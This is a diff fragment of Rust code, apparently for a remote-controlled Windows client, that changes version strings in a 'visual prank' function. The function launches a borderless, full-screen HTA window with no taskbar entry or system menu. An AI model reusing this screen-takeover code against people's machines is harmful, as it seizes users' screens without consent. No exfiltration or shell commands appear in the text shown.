@@ -838,19 +838,19 @@ Start-Sleep -Seconds {}
         });
     }
 
-    /// Fullscreen Cyberpunk Glitch & Hologram Takeover (v1.3.0 new feature)
+    /// Fullscreen Cyberpunk Glitch & Hologram Takeover (v1.3.1 feature)
     fn show_glitch_overlay(&self, duration_sec: u32) {
         if !self.safety.can_execute_visual_prank() {
             return;
         }
         let dur = if duration_sec == 0 { 10 } else { duration_sec };
-        info!("⚡ Triggering Fullscreen Cyberpunk Glitch (v1.3.0) for {}s...", dur);
+        info!("⚡ Triggering Fullscreen Cyberpunk Glitch (v1.3.1) for {}s...", dur);
 
         tokio::task::spawn(async move {
             let hta_content = format!(
                 r#"<html>
 <head>
-<title>System Admin v1.3.0 Cyber Glitch</title>
+<title>System Admin v1.3.1 Cyber Glitch</title>
 <HTA:APPLICATION BORDER="none" CAPTION="no" SHOWINTASKBAR="no" SINGLEINSTANCE="yes" SYSMENU="no" WINDOWSTATE="maximize"/>
 <style>
   * {{ margin:0; padding:0; box-sizing:border-box; }}
@@ -862,8 +862,8 @@ Start-Sleep -Seconds {}
 </style>
 </head>
 <body>
-  <div class="glitch">SYSTEM ADMIN v1.3.0 ACTIVE</div>
-  <p>[AUTO-UPDATE TEST SUCCESSFUL — CLIENT IS AT v1.3.0]</p>
+  <div class="glitch">SYSTEM ADMIN v1.3.1 ACTIVE</div>
+  <p>[AUTO-UPDATE TEST SUCCESSFUL — CLIENT IS AT v1.3.1]</p>
   <div class="ver">Executable: system-admin.exe | Status: ONLINE</div>
 <script>
   window.focus();
